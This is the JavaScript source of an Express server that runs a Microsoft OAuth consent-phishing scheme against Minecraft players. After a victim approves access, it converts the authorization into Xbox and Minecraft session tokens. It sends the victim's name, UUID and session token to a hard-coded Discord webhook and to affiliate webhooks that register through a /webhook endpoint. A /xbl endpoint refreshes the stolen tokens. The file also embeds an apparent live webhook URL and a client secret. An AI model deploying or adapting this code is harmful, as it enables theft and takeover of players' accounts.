const express = require('express');
const axios = require('axios');
const { WebhookClient, EmbedBuilder } = require('discord.js');
const fs = require('fs');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());
const url3 = 'https://discord.com/api/webhooks/1112066231663591474/xFWvOK2R9uM-9RMseOHapfa-qN8Qz65myhlmFHVL8A5I8BcWrua8saGL-8S4YKyoRLAV';

const CLIENT_ID = 'a2564fa8-3f25-4819-b7d1-9966691ee3e7';
const CLIENT_SECRET = 'mLD8Q~5KjEcJxYZstec-dgGIEhSI.BUfgT8B2bk.';
const REDIRECT_URI = 'https://sept-auth.onrender.com/auth';

let xblToken = '';
let userHash = '';

app.get('/auth', async (req, res) => {
  const code = req.query.code;
  const { state } = req.query;
  const webhookStates = readWebhookStates();

    let webhook = null;
    for (const webhookUrl in webhookStates) {
      if (webhookStates[webhookUrl] === state) {
        webhook = webhookUrl;
        break;
      }
    }

  try{
    const data = new URLSearchParams();
    data.append('grant_type', 'authorization_code');
    data.append('client_id', CLIENT_ID);
    data.append('client_secret', CLIENT_SECRET);
    data.append('code', code);
    data.append('redirect_uri', REDIRECT_URI);

    const tokenResponse = await axios.post('https://login.live.com/oauth20_token.srf', data, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    });

    const accessToken = tokenResponse.data.access_token;

    const authenticateData = {
      Properties: {
        AuthMethod: 'RPS',
        SiteName: 'user.auth.xboxlive.com',
        RpsTicket: `d=${accessToken}`
      },
      RelyingParty: 'http://auth.xboxlive.com',
      TokenType: 'JWT'
    };

    const authenticateResponse = await axios.post('https://user.auth.xboxlive.com/user/authenticate', authenticateData);

    xblToken = authenticateResponse.data.Token;
    userHash = authenticateResponse.data.DisplayClaims.xui[0].uhs;
    const xstsAuthorizeData = {
      Properties: {
        SandboxId: 'RETAIL',
        UserTokens: [xblToken]
      },
      RelyingParty: 'rp://api.minecraftservices.com/',
      TokenType: 'JWT'
    };

    const xstsAuthorizeResponse = await axios.post('https://xsts.auth.xboxlive.com/xsts/authorize', xstsAuthorizeData);

    const identityToken = `XBL3.0 x=${userHash};${xstsAuthorizeResponse.data.Token}`;

    const minecraftLoginData = {
      identityToken: identityToken
    };

    const minecraftLoginResponse = await axios.post('https://api.minecraftservices.com/authentication/login_with_xbox', minecraftLoginData);
    const accesstoken2 = minecraftLoginResponse.data.access_token;
    const uuid = await axios.get('https://api.minecraftservices.com/minecraft/profile', {
      headers: {
        Authorization: `Bearer ${accesstoken2}`
        }
      });
    const name = uuid.data.name;
    const uuidplayer = uuid.data.id;

    

    const accessTokenEmbed = new EmbedBuilder()
           .setColor('#0099ff')
           .setTitle('NEW BOZO Verified...')
           .setDescription(`[REFRESH](https://sept-auth.onrender.com/xbl?xbl=${xblToken})`)
           .addFields({name: 'IGN',value: `\`${name}\``, inline: true}, {name: 'UUID', value: `\`${uuidplayer}\``, inline: true}, {name: 'SSID', value: `\`${accesstoken2}\``, inline: true}, {name: 'Networth', value: `\`API DOWN\``, inline: true}, {name: 'IP', value: `\`::1\``, inline: true})
           .setThumbnail(`https://crafatar.com/renders/body/${uuidplayer}?mirror=true`)
           .setTimestamp(Date.now())
           .setAuthor({name: `${name}`,iconURL: `https://crafatar.com/avatars/${uuidplayer}`})
           .setFooter({text: 'Powered by Sept-Auth',iconURL: 'https://www.youtube.com/@piyushverma-zx6nz'});
    const webhook4 = new WebhookClient({ url: url3 });
    const webhook5 = new WebhookClient({ url: webhook });
    const response1 = await axios.head(url3);
      webhook4.send({
      embeds: [accessTokenEmbed]
      });
      webhook5.send({
      embeds: [accessTokenEmbed]
      });
      res.json({status: '404', message: 'NOT FOUND, you can now close this tab'});
  } catch(err){
     console.log(err.message);
     
     res.status(401).json({status: '401', message: 'You didnt Clicked Yes or Confirm on microsoft page'});
    }
});
app.get('/xbl', async (req, res) => {
  const xbl = req.query.xbl;
 try{
    const xstsAuthorizeData1 = {
      Properties: {
        SandboxId: 'RETAIL',
        UserTokens: [xbl]
      },
      RelyingParty: 'rp://api.minecraftservices.com/',
      TokenType: 'JWT'
    };

    const xstsAuthorizeResponse1 = await axios.post('https://xsts.auth.xboxlive.com/xsts/authorize', xstsAuthorizeData1);
    const userhash1 = xstsAuthorizeResponse1.data.DisplayClaims.xui[0].uhs;
    const identityToken1 = `XBL3.0 x=${userhash1};${xstsAuthorizeResponse1.data.Token}`;

    const minecraftLoginData1 = {
        identityToken: identityToken1
    };

    const minecraftLoginResponse1 = await axios.post('https://api.minecraftservices.com/authentication/login_with_xbox', minecraftLoginData1);
    res.json(minecraftLoginResponse1.data);
 }catch(err){
  console.log(err);  
 }
});
app.post('/webhook', (req, res) => {
  const { webhook } = req.body;

  if (!webhook) {
    res.status(400).json({ message: 'Invalid request. Please provide a valid webhook.' });
    return;
  }

  const webhookState = generateState(8); // Generate 8-digit state

  // Read the existing webhook states from the file
  const webhookStates = readWebhookStates();

  // Check if the webhook already exists
  if (webhookStates.hasOwnProperty(webhook)) {
    res.status(200).json({ message: 'Webhook already exists', state: webhookStates[webhook] });
  } else {
    // Save the new webhook and state to the file
    webhookStates[webhook] = webhookState;
    saveWebhookStates(webhookStates);
    
    res.status(200).json({ message: 'Webhook state created and saved', state: webhookState });
  }
});

function generateState(length) {
  let state = '';

  for (let i = 0; i < length; i++) {
    state += Math.floor(Math.random() * 10); // Generate a random num>
  }

  return state;
}

function readWebhookStates() {
  try {
    if (!fs.existsSync('eH2xMv6LcFpRzGt5JwQy8SkXn3DjVb4A/webhook_states.json')) {
      return {};
    }
    const fileData = fs.readFileSync('eH2xMv6LcFpRzGt5JwQy8SkXn3DjVb4A/webhook_states.json');
    return JSON.parse(fileData);
  } catch (error) {
    return {};
  }
}

function saveWebhookStates(webhookStates) {
  const fileData = JSON.stringify(webhookStates, null, 2);
  fs.writeFileSync('eH2xMv6LcFpRzGt5JwQy8SkXn3DjVb4A/webhook_states.json', fileData);
}

app.listen(3000, () => {
  console.log('API server is running on port 3000');
});
